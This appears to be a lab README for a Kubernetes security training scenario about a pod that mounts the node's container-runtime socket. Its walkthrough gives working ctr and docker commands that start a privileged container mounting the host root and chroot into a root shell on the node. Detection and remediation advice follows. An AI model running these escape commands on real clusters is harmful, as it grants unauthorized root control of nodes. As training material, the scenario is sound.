# Scenario 03 — Mounted Container-Runtime Socket

| | |
|---|---|
| **Vuln class** | Isolation / host takeover |
| **Difficulty** | ⭐⭐ Medium |
| **Backends** | kind ✅ (containerd.sock)  AKS ✅ (containerd.sock) |
| **Namespace** | `sock-mount` |
| **MITRE ATT&CK for Containers** | [T1610 Deploy Container](https://attack.mitre.org/techniques/T1610/), [T1611 Escape to Host](https://attack.mitre.org/techniques/T1611/) |

## What it is
The pod mounts the node's `/var/run` directory, which contains the container
runtime's control socket (`containerd.sock` on kind/AKS nodes; `docker.sock` on
classic Docker hosts). Anyone who can talk to that socket can create containers.

## Why it matters
The runtime socket is a **root-equivalent API for the node**. With it you can
start a new privileged container that mounts the host root filesystem — sidestepping
every Pod Security policy, admission controller, and RBAC rule on the workload.
This is the CI-runner / DinD (Docker-in-Docker) classic that has burned many orgs.

## Deploy just this scenario
```powershell
kubectl apply -f scenarios/03-mounted-container-socket/manifest.yaml
```

## Exploit walkthrough
```powershell
$pod = kubectl -n sock-mount get pod -l app=socket-app -o jsonpath='{.items[0].metadata.name}'
kubectl -n sock-mount exec -it $pod -- sh
```
Inside the pod:
```bash
ls -l /host-run/ | grep -E 'containerd|docker'      # find the socket

# --- containerd path (kind / AKS) ---
apk add --no-cache curl >/dev/null 2>&1 || true
# The containerd socket speaks gRPC; the easy lever is the ctr/crictl CLI.
# Install the containerd client in this disposable pod and point it at the mounted socket:
CRI=/host-run/containerd/containerd.sock
apk add --no-cache containerd
command -v ctr || { echo "The containerd package did not provide ctr for this Alpine repository."; exit 1; }
ctr --address $CRI --namespace k8s.io containers list        # you can see ALL node containers
# Launch a container mounting host root -> escape:
ctr --address $CRI --namespace k8s.io images pull docker.io/library/alpine:3.20
ctr --address $CRI --namespace k8s.io run --privileged \
    --mount type=bind,src=/,dst=/host,options=rbind:rw \
    docker.io/library/alpine:3.20 pwn chroot /host sh
```
```bash
# --- docker.sock path (if /host-run/docker.sock exists) ---
apk add --no-cache docker-cli >/dev/null 2>&1
docker -H unix:///host-run/docker.sock run -it --privileged -v /:/host alpine chroot /host sh
```

## What success looks like
- You can list **every** container on the node (not just your pod).
- You can start a new privileged container whose `chroot /host` is a root shell
  on the node filesystem.

## Detection
- **Falco**: *"Launch Privileged Container"* and *"Container Drift"* /
  *"Unexpected connection to container runtime socket"* rules fire.
- **Audit log**: the pod `create` shows a `hostPath` volume of `/var/run`.
- **kubescape / kube-bench**: flag hostPath mounts of sensitive host paths.

## Remediation
Never mount the runtime socket or `/var/run` into a workload. If you truly need
image builds in-cluster, use a rootless, daemonless builder (Kaniko, Buildah,
BuildKit rootless) — none require the host socket. Enforce with Pod Security
Admission `restricted` and a Kyverno/OPA rule blocking hostPath.

**Before:** `hostPath: { path: /var/run }`
**After:** remove the mount entirely; use Kaniko for builds:
```yaml
containers:
  - name: build
    image: gcr.io/kaniko-project/executor:v1.23.0
    args: ["--dockerfile=Dockerfile","--no-push"]
    # no hostPath, no socket, no privilege
```

## Suggested order
Third. Builds directly on the escape concept from Scenario 02.
